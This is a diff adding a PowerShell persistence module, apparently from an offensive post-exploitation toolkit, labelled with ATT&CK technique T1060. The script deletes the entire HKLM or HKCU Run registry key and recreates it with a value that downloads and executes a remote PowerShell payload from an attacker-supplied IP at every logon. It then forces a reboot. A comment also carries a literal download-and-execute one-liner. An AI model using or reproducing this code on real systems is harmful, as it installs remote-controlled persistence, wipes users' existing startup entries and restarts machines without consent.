@@ -1,0 +1,97 @@
+
+#Title: invoke-registryrun
+#Technique: T1060
+#Tactic: TA0003
+function invoke-registryrun
+    {
+
+    param(
+      [String] $ip
+    )
+    <#
+    .SYNOPSIS
+
+     create a new value on registry  for launch a new powershell prompt persistence PoC.
+
+    .DESCRIPTION
+    Attack Commands: Run with command_prompt! Elevation is not  Required (e.g. root or admin)
+    .LINK
+
+    #>
+    # C:\Windows\system32\windowspowershell\v1.0\powershell.exe -C iex(new-object net.webclient).downloadstring('http://192.168.0.13:5000/consola');consola
+    $uri = "http://" + $ip + ":5000/consola"
+    $good = $false
+    $results = $null
+
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+    $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+        {
+        if (Test-Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run")
+          {
+          #la ruta existe asi que procedemos a borrarla y la creamos de nuevo.
+          Remove-Item "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Recurse -Force
+          Start-Sleep 1
+          $results = reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe -C iex(new-object net.webclient).downloadstring('$uri');consola -id '$global:id'"
+          #$results = reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe"
+          #$results =+ "path : HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
+          $results = $results  +  " path : HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
+          $good = $true
+          }
+        else
+          {
+          $results = reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe -C iex(new-object net.webclient).downloadstring('$uri');consola -id '$global:id'"
+          #$results = reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe"
+          #$results =+ "path : HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
+          $results = $results  +  " path: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
+          $good = $true
+          }
+        }
+    else
+      {
+
+      if (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run")
+        {
+        #la ruta existe asi que procedemos a borrarla y la creamos de nuevo.
+        Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Recurse -Force
+        Start-Sleep 1
+        New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Force
+        $results = reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe -C iex(new-object net.webclient).downloadstring('$uri');consola -id '$global:id'"
+        #$results = reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe"
+        #$results =+ "path : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+        $results = $results  +  " pathpath : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+        $good = $true
+        }
+      else
+        {
+        $results = reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe -C iex(new-object net.webclient).downloadstring('$uri');consola -id '$global:id'"
+        #$results = reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Attpwn /t REG_SZ /d "C:\Windows\system32\windowspowershell\v1.0\powershell.exe"
+        #$results =+ "path : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+        $results = $results  +  " path : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+        $good = $true
+        }
+
+      }
+
+    #Return results
+    return @{results = $results | Out-String; success = $good }
+    }
+
+#Main program
+$execute = {
+
+}
+#GiveMeData if needed
+#get-credentials
+$execute = invoke-registryrun -ip $global:remoteip
+#PutData if needed
+  # if($execute.success)
+  # {
+
+  # }
+if($execute.success)
+  {
+  start-Job {Restart-Computer -Force}
+  }
+
+return @{results=$execute.results;success=$execute.success}
